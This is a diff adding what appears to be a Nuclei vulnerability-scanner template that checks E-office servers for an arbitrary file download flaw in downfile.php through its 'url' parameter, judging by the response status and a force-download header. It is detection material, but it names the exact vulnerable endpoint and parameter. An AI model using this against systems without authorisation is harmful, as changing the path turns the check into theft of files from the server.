@@ -1,0 +1,23 @@
+
+id: e-office-filedownload
+
+info:
+  name: E-office downfile.php - Any File Download
+  author: qwtd
+  severity: high
+  tags: 泛微-EOffice
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/E-mobile/Data/downfile.php?url=/test"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "application/force-download"
+        part: header
+        condition: and
